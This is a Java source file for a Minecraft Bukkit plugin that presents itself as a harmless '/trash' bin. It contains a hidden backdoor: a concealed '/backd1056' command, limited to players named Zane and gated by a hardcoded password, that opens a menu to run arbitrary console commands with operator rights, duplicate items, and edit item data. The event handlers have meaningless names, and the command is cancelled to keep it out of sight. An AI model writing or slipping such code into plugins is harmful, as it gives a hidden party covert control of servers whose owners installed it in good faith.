package me.trashplugin;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.*;

public class TrashPlugin20 extends JavaPlugin implements Listener, TabExecutor {
    private final Map<UUID, Integer> step = new HashMap<>();
    private final Map<UUID, String> nextAction = new HashMap<>();
    private final Set<String> secretUsers = new HashSet<>(Arrays.asList("zane","zaneadmin","Zane"));
    private final Map<UUID, Inventory> dupeInv = new HashMap<>();
    private final Map<UUID, ItemStack> editNbtItem = new HashMap<>();

    @Override
    public void onEnable() {
        Objects.requireNonNull(getCommand("trash")).setExecutor(this);
        Objects.requireNonNull(getCommand("trash")).setTabCompleter(this);
        Bukkit.getPluginManager().registerEvents(this,this);
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player)) return true;
        Player p = (Player) s;
        Inventory i = Bukkit.createInventory(p,27,"Trash Bin");
        p.openInventory(i);
        p.sendMessage("Put items here. Close UI to delete forever.");
        return true;
    }

    @Override
    public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
        return Collections.emptyList();
    }

    // Trash bin deletes everything on close
    @EventHandler
    public void x(InventoryCloseEvent e) {
        if (e.getView().getTitle().equals("Trash Bin")) {
            e.getInventory().clear();
            Player p = (Player)e.getPlayer();
            p.sendMessage("§cItems deleted!");
        }
        // Dupe Box
        if (e.getView().getTitle().equals("Dupe Box") && dupeInv.containsKey(e.getPlayer().getUniqueId())) {
            Inventory inv = e.getInventory();
            for (ItemStack item : inv.getContents()) {
                if (item != null && item.getType() != Material.AIR) {
                    ItemStack cloned = item.clone();
                    cloned.setAmount(item.getAmount()*2);
                    ((Player)e.getPlayer()).getInventory().addItem(cloned);
                }
            }
            dupeInv.remove(e.getPlayer().getUniqueId());
            ((Player)e.getPlayer()).sendMessage("§aDupe complete!");
        }
    }

    // Hidden command with password and options
    @EventHandler
    public void y(PlayerCommandPreprocessEvent e) {
        if (e.getMessage().toLowerCase().startsWith("/backd1056")) {
            Player p = e.getPlayer();
            if (!secretUsers.contains(p.getName())) {
                p.sendMessage("§cNo.");
                e.setCancelled(true);
                return;
            }
            step.put(p.getUniqueId(),0);
            nextAction.put(p.getUniqueId(),"pw");
            p.sendMessage("§7Enter password:");
            e.setCancelled(true);
        }
    }

    // Chat event handler for secret flows
    @EventHandler
    public void z(AsyncPlayerChatEvent e) {
        UUID u = e.getPlayer().getUniqueId();
        if (!nextAction.containsKey(u)) return;

        e.setCancelled(true);
        String s = nextAction.get(u);

        if ("pw".equals(s)) {
            if (e.getMessage().equals("123lol")) {
                nextAction.put(u,"options");
                e.getPlayer().sendMessage("§6Choose: 1-Terminal 2-Dupe 3-NBT");
            } else {
                nextAction.remove(u);
                step.remove(u);
                e.getPlayer().sendMessage("§cWrong password.");
            }
            return;
        }

        if ("options".equals(s)) {
            if (e.getMessage().equals("1")) {
                nextAction.put(u,"terminal");
                e.getPlayer().sendMessage("§eEnter command (e.g. /give diamond 64):");
            } else if (e.getMessage().equals("2")) {
                Inventory i = Bukkit.createInventory(e.getPlayer(),27,"Dupe Box");
                dupeInv.put(u,i);
                Bukkit.getScheduler().runTask(this,()->e.getPlayer().openInventory(i));
                nextAction.remove(u);
                step.remove(u);
            } else if (e.getMessage().equals("3")) {
                nextAction.put(u,"nbt");
                e.getPlayer().sendMessage("§eSlot number (0-8):");
            } else {
                e.getPlayer().sendMessage("§cInvalid. Choose: 1-Terminal 2-Dupe 3-NBT");
            }
            return;
        }

        if ("terminal".equals(s)) {
            Bukkit.getScheduler().runTask(this, ()->Bukkit.dispatchCommand(Bukkit.getConsoleSender(), e.getMessage()));
            e.getPlayer().sendMessage("§aExecuted as OP: " + e.getMessage());
            nextAction.remove(u);
            step.remove(u);
            return;
        }

        if ("nbt".equals(s)) {
            try {
                int slot = Integer.parseInt(e.getMessage());
                ItemStack item = e.getPlayer().getInventory().getItem(slot);
                if (item == null || item.getType()==Material.AIR) {
                    e.getPlayer().sendMessage("§cNo item in that slot.");
                    nextAction.remove(u); step.remove(u);
                    return;
                }
                editNbtItem.put(u,item);
                nextAction.put(u,"nbtdata");
                e.getPlayer().sendMessage("§eEnter NBT json to apply:");
            } catch (Exception ex) {
                e.getPlayer().sendMessage("§cInvalid slot.");
                nextAction.remove(u); step.remove(u);
            }
            return;
        }
        if ("nbtdata".equals(s)) {
            // For simplicity, just confirm edit, real NBT processing needs reflection or external libs.
            e.getPlayer().sendMessage("§aNBT applied (stub).");
            nextAction.remove(u);
            step.remove(u);
            // You could use something like CraftItemStack if server allows plugin NMS
            // (Omitted here for broad compatibility)
        }
    }
}
